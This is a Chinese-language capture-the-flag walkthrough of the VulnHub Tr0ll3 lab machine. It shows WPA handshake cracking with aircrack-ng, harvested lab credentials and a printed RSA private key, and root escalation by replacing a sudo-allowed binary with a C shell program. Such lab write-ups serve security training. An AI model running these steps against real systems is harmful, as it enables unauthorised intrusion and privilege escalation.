<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh start@192.168.56.120</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">start@192.168.56.120<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">start@Tr0ll3:~$ id</span></span><br><span class="line"><span class="string">uid=1001(start) gid=1001(start) groups=1001(start)</span></span><br><span class="line"><span class="string">start@Tr0ll3:~$ whoami</span></span><br><span class="line"><span class="string">start</span></span><br><span class="line"><span class="string">start@Tr0ll3:~$ ls</span></span><br><span class="line"><span class="string">bluepill  redpill</span></span><br><span class="line"><span class="string">start@Tr0ll3:~$</span></span><br></pre></td></tr></table></figure>

<p>如下所示使用find命令枚举具有“0777”所有权限的可写文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">start@Tr0ll3:~$ find / -<span class="built_in">type</span> f -perm 0777 2&gt;/dev/null</span><br><span class="line">/var/<span class="built_in">log</span>/.dist-manage/wytshadow.cap</span><br><span class="line">/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt</span><br></pre></td></tr></table></figure>

<p>发现两个有趣的文件，一个是“.cap文件”（wytshadow.cap），另一个是“文本文件”（gold_star.txt）。</p>
<p>并将它们下载下来，然后分析它们</p>
<p>有了.cap文件，可以用Wireshark打开该文件，发现所有数据包都将协议标记为“ 802.11”，并且捕获的流量看起来像无线网络数据包，因为众所周知，802.11是用于传输的协议无线连接的设备之间的数据包的数量。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub236.jpg"></li>
</ul>
<p>嗯！在这里aircrack-ng可能有助于提取密码。在这里可以将gold_star.txt文件与wytshadow.cap一起使用，如下图所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll3<span class="comment"># aircrack-ng -w gold_star.txt wytshadow.cap</span></span><br><span class="line">Reading packets, please <span class="built_in">wait</span>...</span><br><span class="line">Opening wytshadow.cap</span><br><span class="line">Read 1183 packets.</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  BSSID              ESSID                     Encryption</span></span><br><span class="line"></span><br><span class="line">   1  18:D6:C7:3F:23:89  wytshadow                 WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Reading packets, please <span class="built_in">wait</span>...</span><br><span class="line">Opening wytshadow.cap</span><br><span class="line">Read 1183 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                               Aircrack-ng 1.6 </span><br><span class="line"></span><br><span class="line">      [00:04:34] 2451168/3248872 keys tested (9090.46 k/s) </span><br><span class="line"></span><br><span class="line">      Time left: 1 minute, 27 seconds                           75.45%</span><br><span class="line"></span><br><span class="line">                          KEY FOUND! [ gaUoCe34t1 ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : ED 12 0B 40 F5 AF 80 16 F5 F7 4F 9F 9E 39 BB AE </span><br><span class="line">                       00 32 07 E9 26 81 31 DB 9C 54 64 84 5E 5D 19 C6 </span><br><span class="line"></span><br><span class="line">      Transient Key  : 7F 1C A9 01 4E B9 B3 6F B3 95 7D D2 6E C9 10 BE </span><br><span class="line">                       50 D4 1A 6C 72 F8 AB 8B 97 A4 20 B1 2D 92 19 18 </span><br><span class="line">                       C7 86 C0 17 2D 05 28 C7 6F 95 06 12 4F C2 F5 2A </span><br><span class="line">                       87 B7 F5 21 22 3D F7 CA BC 99 8B B5 CA 15 EA 43 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 73 4D E4 22 8E B7 F2 91 4E 74 7D CF 59 73 80 F7</span><br></pre></td></tr></table></figure>

<p>太屌了！！aircrack-ng给了密码:gaUoCe34t1。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub237.jpg"></li>
</ul>
<p>获取密码后，将使用凭据wytshadow：gaUoCe34t1切换到另一个名为“wytshadow的帐户”的帐户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">start@Tr0ll3:~$ su wytshadow</span><br><span class="line">Password: </span><br><span class="line">wytshadow@Tr0ll3:/home/start$ id</span><br><span class="line">uid=1003(wytshadow) gid=1003(wytshadow) groups=1003(wytshadow)</span><br><span class="line">wytshadow@Tr0ll3:/home/start$ whoami</span><br><span class="line">wytshadow</span><br><span class="line">wytshadow@Tr0ll3:/home/start$ <span class="built_in">pwd</span></span><br><span class="line">/home/start</span><br><span class="line">wytshadow@Tr0ll3:/home/start$ ls</span><br><span class="line">ls: cannot open directory <span class="string">&#x27;.&#x27;</span>: Permission denied</span><br></pre></td></tr></table></figure>

<p>成功登录后，查看了“/”目录的目录和文件列表，并注意到一个名为“ohhfun”的文件具有SUID位，因此它具有以root身份运行的权限。</p>
<p>考虑到这一点，按照给定的图形运行了文件。在这里可以看到它通过连续执行文本消息指向LYNX。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wytshadow@Tr0ll3:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/wytshadow</span><br><span class="line">wytshadow@Tr0ll3:~$ ./oohfun</span><br><span class="line">iM Cr@zY L1k3 AAA LYNX</span><br><span class="line">iM Cr@zY L1k3 AAA LYNX</span><br><span class="line">iM Cr@zY L1k3 AAA LYNX</span><br></pre></td></tr></table></figure>

<p>Lynx是一个命令行浏览器，也许它将不得不做进一步的工作。</p>
<p>然后，使用Wytshadow的sudo权限，发现nginx可作为root运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wytshadow@Tr0ll3:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> wytshadow: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> wytshadow on Tr0ll3:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User wytshadow may run the following commands on Tr0ll3:</span><br><span class="line">    (root) /usr/sbin/service nginx start</span><br></pre></td></tr></table></figure>

<p>遍历nginx目录并打开其配置文件“sites-enabled sites”文件。看到用户代理为Lynx，正在侦听8080。</p>
<p>如下所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wytshadow@Tr0ll3:/etc/nginx/sites-enabled$ cat default </span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># You should look at the following URL&#x27;s in order to grasp a solid understanding</span></span><br><span class="line"><span class="comment"># of Nginx configuration files in order to fully unleash the power of Nginx.</span></span><br><span class="line"><span class="comment"># https://www.nginx.com/resources/wiki/start/</span></span><br><span class="line"><span class="comment"># https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/</span></span><br><span class="line"><span class="comment"># https://wiki.debian.org/Nginx/DirectoryStructure</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># In most cases, administrators will remove this file from sites-enabled/ and</span></span><br><span class="line"><span class="comment"># leave it as reference inside of sites-available where it will continue to be</span></span><br><span class="line"><span class="comment"># updated by the nginx packaging team.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This file will automatically load configuration files provided by other</span></span><br><span class="line"><span class="comment"># applications, such as Drupal or Wordpress. These applications will be made</span></span><br><span class="line"><span class="comment"># available underneath a path with that package name, such as /drupal8.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Default server configuration</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">server &#123;</span><br><span class="line">        listen 8080 default_server;</span><br><span class="line">        listen [::]:8080 default_server;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$http_user_agent</span> !~ <span class="string">&quot;Lynx*&quot;</span>)&#123;</span><br><span class="line">    <span class="built_in">return</span> 403;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment"># SSL configuration</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># listen 443 ssl default_server;</span></span><br><span class="line">        <span class="comment"># listen [::]:443 ssl default_server;</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Note: You should disable gzip for SSL traffic.</span></span><br><span class="line">        <span class="comment"># See: https://bugs.debian.org/773332</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Read up on ssl_ciphers to ensure a secure configuration.</span></span><br><span class="line">        <span class="comment"># See: https://bugs.debian.org/765782</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Self signed certs generated by the ssl-cert package</span></span><br><span class="line">        <span class="comment"># Don&#x27;t use them in a production server!</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># include snippets/snakeoil.conf;</span></span><br><span class="line"></span><br><span class="line">        root /var/nginx/www;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Add index.php to the list if you are using PHP</span></span><br><span class="line">        index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">        server_name _;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                <span class="comment"># First attempt to serve request as file, then</span></span><br><span class="line">                <span class="comment"># as directory, then fall back to displaying a 404.</span></span><br><span class="line">                try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ =404;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pass PHP scripts to FastCGI server</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ \.php$ &#123;</span></span><br><span class="line">        <span class="comment">#       include snippets/fastcgi-php.conf;</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#       # With php-fpm (or other unix sockets):</span></span><br><span class="line">        <span class="comment">#       fastcgi_pass unix:/var/run/php/php7.0-fpm.sock;</span></span><br><span class="line">        <span class="comment">#       # With php-cgi (or other tcp sockets):</span></span><br><span class="line">        <span class="comment">#       fastcgi_pass 127.0.0.1:9000;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># deny access to .htaccess files, if Apache&#x27;s document root</span></span><br><span class="line">        <span class="comment"># concurs with nginx&#x27;s one</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ /\.ht &#123;</span></span><br><span class="line">        <span class="comment">#       deny all;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Virtual Host configuration for example.com</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You can move that to a different file under sites-available/ and symlink that</span></span><br><span class="line"><span class="comment"># to sites-enabled/ to enable it.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#server &#123;</span></span><br><span class="line"><span class="comment">#       listen 80;</span></span><br><span class="line"><span class="comment">#       listen [::]:80;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#       server_name example.com;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#       root /var/www/example.com;</span></span><br><span class="line"><span class="comment">#       index index.html;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#       location / &#123;</span></span><br><span class="line"><span class="comment">#               try_files $uri $uri/ =404;</span></span><br><span class="line"><span class="comment">#       &#125;</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br></pre></td></tr></table></figure>

<p>此外，如上所示，启动了nginx服务。使用netstat命令，看到端口8080已打开。再次尝试进行nmap扫描，如下所示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wytshadow@Tr0ll3:/etc/nginx/sites-enabled$ sudo /usr/sbin/service nginx start</span><br><span class="line">wytshadow@Tr0ll3:/etc/nginx/sites-enabled$ netstat -antp</span><br><span class="line">(No info could be <span class="built_in">read</span> <span class="keyword">for</span> <span class="string">&quot;-p&quot;</span>: geteuid()=1003 but you should be root.)</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 192.168.56.120:22       192.168.56.1:20737      ESTABLISHED -                   </span><br><span class="line">tcp        0    448 192.168.56.120:22       192.168.56.102:48480    ESTABLISHED -                   </span><br><span class="line">tcp6       0      0 :::8080                 :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      - </span><br></pre></td></tr></table></figure>

<p>如前所述，在本地计算机上安装一个lynx浏览器。打开与刚打开的端口关联的页面。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll3<span class="comment"># apt-get install lynx</span></span><br><span class="line">...</span><br><span class="line">root@kali:~/vulnhub/troll3<span class="comment"># lynx http://192.168.56.120:8080/</span></span><br><span class="line">genphlux:HF9nd0cR!</span><br></pre></td></tr></table></figure>

<p>通过lynx打开页面上给定的链接时，会找到这些登录凭据。不是那么困难。</p>
<p>找到的凭证：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Username: genphlux</span><br><span class="line">Password: HF9nd0cr!</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub238.jpg"></li>
</ul>
<p>随着有了更多的凭据，使用上述枚举凭据切换到genphlux的用户。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wytshadow@Tr0ll3:/home$ su genphlux</span><br><span class="line">Password: </span><br><span class="line">genphlux@Tr0ll3:/home$ id</span><br><span class="line">uid=1004(genphlux) gid=1004(genphlux) groups=1004(genphlux)</span><br><span class="line">genphlux@Tr0ll3:/home$ whoami</span><br><span class="line">genphlux</span><br><span class="line">genphlux@Tr0ll3:/home$ <span class="built_in">pwd</span></span><br><span class="line">/home</span><br><span class="line">genphlux@Tr0ll3:/home$</span><br></pre></td></tr></table></figure>

<p>登录后，找到了一个名为maleus的文件，如下所示，并且通过浏览该文件，看到了它存储RSA密钥。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">genphlux@Tr0ll3:/home$ <span class="built_in">cd</span></span><br><span class="line">genphlux@Tr0ll3:~$ ls -la</span><br><span class="line">total 44</span><br><span class="line">drwx------  4 genphlux genphlux 4096 Aug  2  2019 .</span><br><span class="line">drwxr-xr-x 10 root     root     4096 Jun 19  2015 ..</span><br><span class="line">-rw-r--r--  1 genphlux genphlux  220 Jun 17  2015 .bash_logout</span><br><span class="line">-rw-r--r--  1 genphlux genphlux 3637 Jun 17  2015 .bashrc</span><br><span class="line">drwx------  2 genphlux genphlux 4096 Jun 17  2015 .cache</span><br><span class="line">drwx------  3 genphlux genphlux 4096 Aug  1  2019 .gnupg</span><br><span class="line">-rw-rw-r--  1 genphlux genphlux 1675 Jun 18  2015 maleus</span><br><span class="line">-rw-r--r--  1 genphlux genphlux  675 Jun 17  2015 .profile</span><br><span class="line">-rw-------  1 genphlux genphlux 5649 Jun 17  2015 .viminfo</span><br><span class="line">-rw-rw-r--  1 genphlux genphlux  931 Aug  2  2019 xlogin</span><br><span class="line">genphlux@Tr0ll3:~$ file maleus </span><br><span class="line">maleus: PEM RSA private key</span><br><span class="line">genphlux@Tr0ll3:~$ cat maleus </span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAwz5Hwer48U1t/Qi9JveuO+Z7WQlnmhOOs/2pZ0he/OyVsEFv</span><br><span class="line">DsGib1wu/N8t+7h9JZK9x2GL33TXQBVCy6TxES90F1An+2DSza6lJPCyhcgK/DEp</span><br><span class="line">yxSVt32A+lFo+PQJV6QYZlpRkek0MjUw5y/E5qZwdBypC55C4QzgQBN3+Lnuhuk4</span><br><span class="line">u52xcK9/6/2N7JZCNYA21Tp1Uy9mty/65IT7OwKJd2rXp3O6rZYTD/vPl+Rt/LtN</span><br><span class="line">gA1DbDODq0NCmvcrZL+SafSj+MABA3LCERw01gA4RMdyxJU6hVfjeSKOdwDQOGWe</span><br><span class="line">eAVCL2GR/frwyf+rfN1kbpdw/RGXWWwVANMcaQIDAQABAoIBAGNudFztrZo2NK2I</span><br><span class="line">pcwSl0kqN+dAQuLU0vgXVw6ibL2iPxlkOYrqUi8kY0mk32YyrolUEhJYO0Ox3W1l</span><br><span class="line">Zn8PoTV/VUAKMlJzHOhi6PfHHSPEnNOSthYWhajM4cKZczxWC+v2RfbaSHBms45e</span><br><span class="line">SGl0inJskRiRAAZKswSp6gq334FrS6Dwy1tiKvzCfR3kLQghV5U/PhFZCsq3xvAw</span><br><span class="line">eXPx2toNtU2gYSGrKWTep+nAKM1neBxeZAujYuN4xJ5/Th2y0pyTvX9WEgzKPJ/G</span><br><span class="line">PlYZYCUAKPCbabYSuZckjeiN1aS52AIFedECBfAIezOr08Wx/bI/xCOgBxrQgPrK</span><br><span class="line">kRvlOYECgYEA5eCIEfdLhWdg3ltadYE0O5VAoXKrbxYWqSyw1Eyeqj0N1qD9Rsvg</span><br><span class="line">jIQJazV5JcVBIF54f/jlCJozR5s5AELrY0Z/krea1lF5ecOSUQE3tp94298xzO3g</span><br><span class="line">7BBe3g6pD56Cya/Vo0+YVQmAnBHLh6QIYvUUXXN2IyceT8fhEx5JA+sCgYEA2W4z</span><br><span class="line">KKMVAdPxKcjVks1zdGmVlj1RsUkakYuLWV3jQe2w1naJrc37Khy5eWZaRJhXqeBb</span><br><span class="line">1cvTMa+r/BF7jvItxglWoBJqXDxKI0a6KqWtloZL2ynoaBkAhR2btob6nSN63Bpg</span><br><span class="line">ZYJKY1B5yYbDHK4k6QT7atn2g6DAv/7sW6skj/sCgYA16WTAIek6TjZvr6kVacng</span><br><span class="line">N27C7mu6T8ncvzhxcc68SjlWnscHtYTiL40t8YqKCyrs9nr4OF0umUtxfbvujcM6</span><br><span class="line">syv0Ms9DeDQvFGjaSpjQYbIsjrnVP+zCMEyvc2y+1wQBXRWTiXVGbEYXVC0RkKzO</span><br><span class="line">2H+AMzX/pIr9Vvk4TJ//JQKBgFNJcy9NyO46UVbAJ49kQ6WEDFjQhEp0xkiaO3aw</span><br><span class="line">EC1g7yw3m+WH0X4AIsvt+QXtlSbtWkA7I1sU/7w+tiW7fu0tBpGqfDN4pK1+mjFb</span><br><span class="line">5XKTXttE4lF9wkU7Yjo42ib3QEivkd1QW05PtVcM2BBUZK8dyXDUrSkemrbw33j9</span><br><span class="line">xbOhAoGBAL8uHuAs68ki/BWcmWUUer7Y+77YI/FFm3EvP270K5yn0WUjDJXwHpuz</span><br><span class="line">Fg3n294GdjBtQmvyf2Wxin4rxl+1aWuj7/kS1/Fa35n8qCN+lkBzfNVA7f626KRA</span><br><span class="line">wS3CudSkma8StmvgGKIU5YcO8f13/3QB6PPBgNoKnF5BlFFQJqhK</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>因此，将RSA密钥复制到一个名为“key”的文本文件中，并分配了权限600，该权限只能由特定用户访问。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll3<span class="comment"># chmod 600 key</span></span><br><span class="line">root@kali:~/vulnhub/troll3<span class="comment"># ssh maleus@192.168.56.120 -i key</span></span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">maleus@Tr0ll3:~$ id</span><br><span class="line">uid=1000(maleus) gid=1000(maleus) groups=1000(maleus),1005(backups)</span><br><span class="line">maleus@Tr0ll3:~$ whoami</span><br><span class="line">maleus</span><br><span class="line">maleus@Tr0ll3:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/maleus</span><br></pre></td></tr></table></figure>

<p>成功登录后，找到了一个名为“don’t_even_bother”的文件，该文件具有完全权限，并且借助文件的类型，确定其类型为ELF 64位，此外，在其中找到了另一个文件“.viminfo”文件。同一目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maleus@Tr0ll3:~$ ls -la</span><br><span class="line">total 48</span><br><span class="line">drwx------  5 maleus maleus 4096 Aug  2  2019 .</span><br><span class="line">drwxr-xr-x 10 root   root   4096 Jun 19  2015 ..</span><br><span class="line">-rw-r--r--  1 maleus maleus  220 Jun 17  2015 .bash_logout</span><br><span class="line">-rw-r--r--  1 maleus maleus 3637 Jun 17  2015 .bashrc</span><br><span class="line">drwx------  2 maleus maleus 4096 Jun 17  2015 .cache</span><br><span class="line">-rwxrwxr-x  1 maleus maleus 8674 Jun 18  2015 dont_even_bother</span><br><span class="line">drwx------  3 maleus maleus 4096 Aug  1  2019 .gnupg</span><br><span class="line">-rw-r--r--  1 maleus maleus  675 Jun 17  2015 .profile</span><br><span class="line">drwx------  2 maleus maleus 4096 Jun 18  2015 .ssh</span><br><span class="line">-rw-------  1 maleus maleus 1301 Aug  2  2019 .viminfo</span><br></pre></td></tr></table></figure>

<p>此外，使用cat命令来检查viminfo文件。经过仔细检查，发现了maleus用户的密码“B^slc8I$”。这是一个很好的发现。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maleus@Tr0ll3:~$ cat .viminfo</span><br><span class="line"><span class="comment"># This viminfo file was generated by Vim 7.4.</span></span><br><span class="line"><span class="comment"># You may edit it if you&#x27;re careful!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Value of &#x27;encoding&#x27; when this file was written</span></span><br><span class="line">*encoding=utf-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hlsearch on (H) or off (h):</span></span><br><span class="line">~h</span><br><span class="line"><span class="comment"># Command Line History (newest to oldest):</span></span><br><span class="line">:wq</span><br><span class="line">:q</span><br><span class="line">:q!</span><br><span class="line">:!shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># Search String History (newest to oldest):</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Expression History (newest to oldest):</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Input Line History (newest to oldest):</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Input Line History (newest to oldest):</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Registers:</span></span><br><span class="line"><span class="string">&quot;&quot;</span>1     LINE    0</span><br><span class="line">        passwd</span><br><span class="line"><span class="string">&quot;2      LINE    0</span></span><br><span class="line"><span class="string">        B^slc8I$</span></span><br><span class="line"><span class="string">&quot;</span>3      LINE    0</span><br><span class="line">        passswd  </span><br><span class="line"></span><br><span class="line"><span class="comment"># File marks:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Jumplist (newest first):</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># History of marks within files (newest to oldest):</span></span><br><span class="line"></span><br><span class="line">        +       25      62</span><br><span class="line"></span><br><span class="line">&gt; ~/Desktop/troll3/maleus</span><br><span class="line">        *       1564779412      0</span><br><span class="line">        <span class="string">&quot;       27      28</span></span><br><span class="line"><span class="string">        ^       27      29</span></span><br><span class="line"><span class="string">        .       27      28</span></span><br><span class="line"><span class="string">        +       27      28</span></span><br><span class="line"><span class="string">&gt; ~/Desktop/troll3/maleus</span></span><br><span class="line"><span class="string">        *       1564779412      0</span></span><br><span class="line"><span class="string">        &quot;</span>       27      28</span><br><span class="line">        ^       27      29</span><br><span class="line">        .       27      28</span><br><span class="line">        +       27      28</span><br><span class="line">&gt; ~/Desktop/troll3/maleus</span><br><span class="line">        *       1564779412      0</span><br><span class="line">        <span class="string">&quot;       27      28</span></span><br><span class="line"><span class="string">        ^       27      29</span></span><br><span class="line"><span class="string">        .       27      28</span></span><br><span class="line"><span class="string">        +       27      28</span></span><br><span class="line"><span class="string">&gt; ~/Desktop/troll3/maleus</span></span><br><span class="line"><span class="string">        *       1564779412      0</span></span><br><span class="line"><span class="string">        &quot;</span>       27      28</span><br><span class="line">        ^       27      29</span><br><span class="line">        .       27      28</span><br><span class="line">        +       27      28</span><br><span class="line">&gt; ~/Desktop/troll3/maleus</span><br><span class="line">        *       1564779412      0</span><br><span class="line">        <span class="string">&quot;       27      28</span></span><br><span class="line"><span class="string">        ^       27      29</span></span><br><span class="line"><span class="string">        .       27      28</span></span><br><span class="line"><span class="string">        +       27      28</span></span><br><span class="line"><span class="string">&gt; ~/Desktop/troll3/maleus</span></span><br><span class="line"><span class="string">        *       1564779412      0</span></span><br><span class="line"><span class="string">        &quot;</span>       27      28</span><br><span class="line">        ^       27      29</span><br><span class="line">        .       27      28</span><br><span class="line">        +       27      28</span><br><span class="line">&gt; ~/Desktop/troll3/maleus</span><br><span class="line">        *       1564779412      0</span><br><span class="line">        <span class="string">&quot;       27      28</span></span><br><span class="line"><span class="string">        ^       27      29</span></span><br><span class="line"><span class="string">        .       27      28</span></span><br><span class="line"><span class="string">        +       27      28</span></span><br><span class="line"><span class="string">&gt; ~/Desktop/troll3/maleus</span></span><br><span class="line"><span class="string">        *       1564779412      0</span></span><br><span class="line"><span class="string">        &quot;</span>       27      28</span><br><span class="line">        ^       27      29</span><br><span class="line">        .       27      28</span><br><span class="line">        +       27      28</span><br><span class="line">&gt; ~/Desktop/troll3/maleus</span><br><span class="line">        *       1564779412      0</span><br><span class="line">        <span class="string">&quot;       27      28</span></span><br><span class="line"><span class="string">        ^       27      29</span></span><br><span class="line"><span class="string">        .       27      28</span></span><br><span class="line"><span class="string">        +       27      28</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>现在有了maleus的密码，确定maleus的sudo权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maleus@Tr0ll3:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> maleus: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> maleus on Tr0ll3:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User maleus may run the following commands on Tr0ll3:</span><br><span class="line">    (root) /home/maleus/dont_even_bother</span><br></pre></td></tr></table></figure>

<p>运行命令后，发现maleus可以以root用户身份运行don’t_even_bother文件。因此，为了提升此计算机上的权限，将使用此文件来注入恶意代码。首先，使用echo清空此文件的内容，然后使用nano命令对其进行编辑。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maleus@Tr0ll3:~$ <span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; dont_even_bother</span><br><span class="line">maleus@Tr0ll3:~$ cat dont_even_bother </span><br><span class="line"></span><br><span class="line">maleus@Tr0ll3:~$ nano dont_even_bother.c</span><br></pre></td></tr></table></figure>

<p>现在，在打开该文件之后，编写了一个小的.C脚本，它将在编译后执行时调用shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int main (void)&#123;</span><br><span class="line">       setresuid(0, 0, 0);</span><br><span class="line">       system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，因为是“.c”文件，所以将不得不使用gcc编译器对其进行编译，然后按照sudo权限执行该文件dont_even_bother。</p>
<p>即可获取系统root权限并且找到了flag文件，如下所示：</p>
